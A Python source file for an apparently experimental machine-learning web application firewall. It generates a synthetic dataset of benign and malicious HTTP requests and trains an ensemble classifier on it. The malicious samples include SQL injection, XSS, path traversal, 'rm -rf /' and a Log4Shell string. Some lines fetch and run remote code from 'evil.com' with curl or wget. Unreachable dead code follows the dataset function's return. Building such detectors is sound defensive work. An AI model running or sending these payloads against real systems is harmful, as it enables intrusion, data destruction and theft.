import numpy as np
import pandas as pd
from sklearn.ensemble import IsolationForest, RandomForestClassifier, GradientBoostingClassifier
from sklearn.linear_model import SGDClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
import joblib
import time
import re
from collections import Counter

class AdaptiveWAF:
    def __init__(self):
        # Layer 1: Anomaly Detection
        self.anomaly_detector = IsolationForest(contamination=0.04, random_state=42, n_jobs=-1)
        
        # Layer 2: Ensemble Classifier
        self.rf_classifier = RandomForestClassifier(n_estimators=100, max_depth=20, random_state=42, n_jobs=-1)
        self.gb_classifier = GradientBoostingClassifier(n_estimators=100, max_depth=7, random_state=42)
        
        # Online learning classifier
        self.sgd_classifier = SGDClassifier(loss='log_loss', random_state=42, max_iter=1000)
        
        # TF-IDF Vectorizer
        self.vectorizer = TfidfVectorizer(ngram_range=(1, 3), max_features=1000, lowercase=True)
        
        self.is_trained = False
        self.blocked_samples = []
        self.X_train_original = None
        self.y_train_original = None
        
    def _extract_features(self, payload):
        """Extract only the most important features"""
        if not payload:
            return [0] * 7
        
        length = len(payload)
        
        # 1. Entropy (detects encoded/obfuscated attacks)
        prob = [payload.count(c) / length for c in set(payload)]
        entropy = -sum(p * np.log2(p) for p in prob if p > 0)
        
        # 2. Special char ratio (detects injection attacks)
        special = len(re.findall(r'[<>\'";(){}]', payload))
        special_ratio = special / length if length > 0 else 0
        
        # 3. SQL keyword count (detects SQL injection)
        sql_keywords = ['SELECT', 'UNION', 'DROP', 'INSERT', 'DELETE', '--', '/*']
        sql_count = sum(payload.upper().count(kw) for kw in sql_keywords)
        
        # 4. XSS pattern count (detects XSS)
        xss_patterns = ['<script', 'javascript:', 'onerror', 'alert(', '<iframe']
        xss_count = sum(payload.lower().count(p) for p in xss_patterns)
        
        # 5. Path traversal (detects directory traversal)
        path_trav = payload.count('../') + payload.count('/etc/') + payload.count('windows')
        
        # 6. Command injection (detects RCE)
        cmd_count = payload.count(';') + payload.count('|') + payload.count('cat ') + payload.count('wget ')
        
        # 7. Payload length (detects buffer overflow)
        length_score = min(length / 100, 10)  # Normalize to 0-10
        
        return [entropy, special_ratio, sql_count, xss_count, path_trav, cmd_count, length_score]
    
    def load_dataset(self):
        """
        Generate a strong synthetic HTTP dataset for a Web Application Firewall.
        """
        import random
        
        # Benign traffic templates
        benign_pages = ['/', '/home', '/index.html', '/about', '/contact', '/services', '/blog', '/products']
        benign_searches = [f'/search?q={q}' for q in ['python', 'tutorial', 'news', 'weather', 'sports', 'tech']]
        benign_api = ['/api/users', '/api/orders', '/api/products', '/api/data']
        benign_static = ['/static/css/main.css', '/static/js/app.js', '/images/logo.png', '/assets/fonts/arial.ttf']
        benign_forms = ['POST /login username=john&password=pass123', 'POST /register email=user@example.com', 'POST /checkout cart_id=456']
        
        benign_all = benign_pages + benign_searches + benign_api + benign_static + benign_forms
        benign = [random.choice(benign_all) for _ in range(4000)]
        
        # Malicious payloads
        sqli = ["' OR '1'='1", "admin'--", "1' UNION SELECT NULL--", "id=1 OR 1=1", "' OR 'a'='a", 
                "1'; DROP TABLE users--", "admin' OR '1'='1'--", "' UNION SELECT password FROM users--",
                "%27%20OR%20%271%27%3D%271", "1' AND '1'='1"]
        
        xss = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
               "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "javascript:alert('xss')",
               "%3Cscript%3Ealert(1)%3C/script%3E", "<input onfocus=alert(1) autofocus>"]
        
        path_trav = ["../../etc/passwd", "../../../windows/system32", "....//....//etc/passwd",
                     "..\\..\\..\\windows\\system32", "/etc/passwd", "../../../var/log/apache/access.log",
                     "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
        
        rce = ["; cat /etc/passwd", "| ls -la", "&& rm -rf /", "curl http://evil.com/x.sh | sh",
               "; wget http://evil.com/shell", "| whoami", "& dir", "`cat /etc/shadow`"]
        
        zero_day = ["${jndi:ldap://evil.com/a}", "A"*1000, "%00%FF%FE%FD", "{{7*7}}", "${7*7}",
                    "<%= 7*7 %>", "#{7*7}", "@{7*7}"]
        
        # Combine all attacks
        attacks = sqli*100 + xss*100 + path_trav*114 + rce*100 + zero_day*100
        
        # Wrap attacks in HTTP templates
        templates = [
            "GET /search?q={} HTTP/1.1",
            "GET /item?id={} HTTP/1.1",
            "POST /login HTTP/1.1 username=admin&password={}",
            "GET /file?path={} HTTP/1.1",
            "{}"
        ]
        
        malicious = [random.choice(templates).format(attack) for attack in attacks[:4000]]
        
        # Combine and shuffle
        X = benign + malicious
        y = [0]*len(benign) + [1]*len(malicious)
        
        # Shuffle
        combined = list(zip(X, y))
        random.shuffle(combined)
        X, y = zip(*combined)
        
        print(f"✓ Generated {len(X)} samples ({len(benign)} benign, {len(malicious)} malicious)")
        return list(X), list(y)
        """Generate synthetic dataset for training"""
        
        # Benign samples (expanded)
        benign = [
            "GET /index.html HTTP/1.1",
            "POST /api/users HTTP/1.1",
            "GET /search?q=python HTTP/1.1",
            "GET /about.html HTTP/1.1",
            "POST /login username=john password=pass123",
            "GET /products?category=electronics HTTP/1.1",
            "GET /contact.html HTTP/1.1",
            "POST /api/data {name: test, value: 123}",
            "GET /blog/post/123 HTTP/1.1",
            "GET /images/logo.png HTTP/1.1",
            "POST /checkout cart_id=456",
            "GET /profile/user/789 HTTP/1.1",
            "GET /api/v1/products?limit=10 HTTP/1.1",
            "POST /comments {text: great article}",
            "GET /dashboard HTTP/1.1",
            "GET /settings HTTP/1.1",
        ] * 250  # 4000 samples
        
        # Malicious samples (expanded with more variants)
        malicious = [
            # SQL Injection (500 samples)
            "' OR '1'='1",
            "admin' --",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "1' AND '1'='1",
            "admin' OR '1'='1'--",
            "' UNION SELECT password FROM users--",
            "1'; EXEC xp_cmdshell--",
        ] * 50 + [
            # XSS (500 samples)
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<svg onload=alert(1)>",
            "<script>document.cookie</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
        ] * 50 + [
            # Path Traversal (500 samples)
            "../../etc/passwd",
            "../../../windows/system32",
            "....//....//etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
            "../../../var/log/apache/access.log",
            "....\\....\\....\\boot.ini",
        ] * 62 + [
            # RCE (500 samples)
            "; cat /etc/passwd",
            "| ls -la",
            "; DROP TABLE users--",
            "'; exec xp_cmdshell--",
            "| whoami",
            "; rm -rf /",
            "| cat /etc/shadow",
            "& dir",
            "; wget http://evil.com/shell",
            "| curl http://evil.com/backdoor",
        ] * 50 + [
            # Zero-day / Advanced (1000 samples)
            "${jndi:ldap://evil.com/a}",  # Log4Shell
            "%00%00%00%00%FF%FE%FD",  # Binary exploit
            "A" * 1000,  # Buffer overflow
            "{{7*7}}",  # Template injection
            "${7*7}",  # Expression injection
            "<%= 7*7 %>",  # ERB injection
            "#{7*7}",  # Ruby injection
            "@{7*7}",  # Razor injection
        ] * 125
        
        X = benign + malicious
        y = [0] * len(benign) + [1] * len(malicious)
        
        print(f"✓ Generated {len(X)} samples ({len(benign)} benign, {len(malicious)} malicious)")
        return X, y
    
    def train(self, X=None, y=None):
        """Train both layers"""
        if X is None:
            X, y = self.load_dataset()
        
        print("Training WAF models...")
        start = time.time()
        
        # TF-IDF transformation
        X_tfidf = self.vectorizer.fit_transform(X)
        
        # Extract custom features
        X_custom = np.array([self._extract_features(payload) for payload in X])
        
        # Combine features
        X_combined = np.hstack([X_tfidf.toarray(), X_custom])
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(X_combined, y, test_size=0.2, random_state=42, stratify=y)
        
        # Store for retraining
        self.X_train_original = X_train
        self.y_train_original = y_train
        
        # Layer 1: Train anomaly detector on benign samples only
        X_benign = X_train[np.array(y_train) == 0]
        self.anomaly_detector.fit(X_benign)
        print("✓ Layer 1 (Anomaly Detection) trained")
        
        # Layer 2: Train ensemble classifiers
        self.rf_classifier.fit(X_train, y_train)
        self.gb_classifier.fit(X_train, y_train)
        self.sgd_classifier.fit(X_train, y_train)
        print("✓ Layer 2 (Ensemble Classifier) trained")
        
        # Evaluate
        self._evaluate(X_test, y_test)
        
        self.is_trained = True
        print(f"✓ Training completed in {time.time() - start:.2f}s")
    
    def _evaluate(self, X_test, y_test):
        """Evaluate model performance"""
        # RF predictions
        y_pred_rf = self.rf_classifier.predict(X_test)
        # GB predictions
        y_pred_gb = self.gb_classifier.predict(X_test)
        # SGD predictions
        y_pred_sgd = self.sgd_classifier.predict(X_test)
        # Ensemble (voting)
        y_pred = ((y_pred_rf + y_pred_gb + y_pred_sgd) / 3).round().astype(int)
        
        acc = accuracy_score(y_test, y_pred)
        cm = confusion_matrix(y_test, y_pred)
        tn, fp, fn, tp = cm.ravel()
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0
        
        print(f"\n=== Model Performance ===")
        print(f"Accuracy: {acc*100:.2f}%")
        print(f"False Positive Rate: {fpr*100:.2f}%")
        print(classification_report(y_test, y_pred, target_names=['Benign', 'Malicious']))
    
    def predict(self, payload):
        """Predict if payload is malicious (low-latency)"""
        if not self.is_trained:
            raise Exception("Model not trained. Call train() first.")
        
        start = time.perf_counter()
        
        # Transform payload
        X_tfidf = self.vectorizer.transform([payload])
        X_custom = np.array([self._extract_features(payload)])
        X_combined = np.hstack([X_tfidf.toarray(), X_custom])
        
        # Layer 1: Anomaly detection (fix 3D array issue)
        anomaly_score = self.anomaly_detector.predict(X_combined.reshape(1, -1))[0]
        
        # Layer 2: Ensemble classification
        rf_pred = self.rf_classifier.predict(X_combined)[0]
        gb_pred = self.gb_classifier.predict(X_combined)[0]
        sgd_pred = self.sgd_classifier.predict(X_combined)[0]
        rf_proba = self.rf_classifier.predict_proba(X_combined)[0]
        gb_proba = self.gb_classifier.predict_proba(X_combined)[0]
        
        # Ensemble decision (3-way voting)
        ensemble_pred = int((rf_pred + gb_pred + sgd_pred) / 3 > 0.5)
        confidence = (rf_proba[1] + gb_proba[1]) / 2
        
        # Final decision: malicious if anomaly OR ensemble detects
        is_malicious = (anomaly_score == -1) or (ensemble_pred == 1)
        
        latency = (time.perf_counter() - start) * 1000
        
        return {
            'is_malicious': bool(is_malicious),
            'confidence': float(confidence),
            'anomaly_detected': anomaly_score == -1,
            'latency_ms': round(latency, 3)
        }
    
    def add_blocked_sample(self, payload, label):
        """Collect blocked samples for retraining"""
        self.blocked_samples.append({'payload': payload, 'label': label})
        print(f"✓ Sample added. Total blocked: {len(self.blocked_samples)}")
    
    def retrain(self):
        """Retrain with new blocked samples (online learning)"""
        if len(self.blocked_samples) < 10:
            print("⚠ Need at least 10 samples to retrain")
            return
        
        print(f"Retraining with {len(self.blocked_samples)} new samples...")
        
        # Extract new samples
        X_new = [s['payload'] for s in self.blocked_samples]
        y_new = [s['label'] for s in self.blocked_samples]
        
        # Transform
        X_tfidf = self.vectorizer.transform(X_new)
        X_custom = np.array([self._extract_features(p) for p in X_new])
        X_combined = np.hstack([X_tfidf.toarray(), X_custom])
        
        # Online learning with SGDClassifier
        self.sgd_classifier.partial_fit(X_combined, y_new, classes=[0, 1])
        
        # Combine with original data and retrain RF/GB
        X_all = np.vstack([self.X_train_original, X_combined])
        y_all = np.concatenate([self.y_train_original, y_new])
        
        self.rf_classifier.fit(X_all, y_all)
        self.gb_classifier.fit(X_all, y_all)
        
        # Update original training data
        self.X_train_original = X_all
        self.y_train_original = y_all
        
        print("✓ Models updated with new samples")
        self.blocked_samples = []
    
    def save(self, path='models/adaptive_waf.pkl'):
        """Save trained models"""
        import os
        os.makedirs(os.path.dirname(path), exist_ok=True)
        joblib.dump({
            'anomaly_detector': self.anomaly_detector,
            'rf_classifier': self.rf_classifier,
            'gb_classifier': self.gb_classifier,
            'sgd_classifier': self.sgd_classifier,
            'vectorizer': self.vectorizer,
            'is_trained': self.is_trained,
            'X_train_original': self.X_train_original,
            'y_train_original': self.y_train_original
        }, path)
        print(f"✓ Models saved to {path}")
    
    def load(self, path='models/adaptive_waf.pkl'):
        """Load trained models"""
        data = joblib.load(path)
        self.anomaly_detector = data['anomaly_detector']
        self.rf_classifier = data['rf_classifier']
        self.gb_classifier = data['gb_classifier']
        self.sgd_classifier = data['sgd_classifier']
        self.vectorizer = data['vectorizer']
        self.is_trained = data['is_trained']
        self.X_train_original = data.get('X_train_original')
        self.y_train_original = data.get('y_train_original')
        print(f"✓ Models loaded from {path}")

# Example usage
if __name__ == "__main__":
    waf = AdaptiveWAF()
    
    # Train on dataset
    waf.train()
    
    # Test predictions
    test_payloads = [
        "GET /index.html HTTP/1.1",
        "' OR '1'='1' --",
        "<script>alert('xss')</script>",
        "../../etc/passwd"
    ]
    
    print("\n=== Testing Predictions ===")
    for payload in test_payloads:
        result = waf.predict(payload)
        print(f"\nPayload: {payload[:50]}")
        print(f"Malicious: {result['is_malicious']}")
        print(f"Confidence: {result['confidence']:.2f}")
        print(f"Latency: {result['latency_ms']}ms")
    
    # Save model
    waf.save()
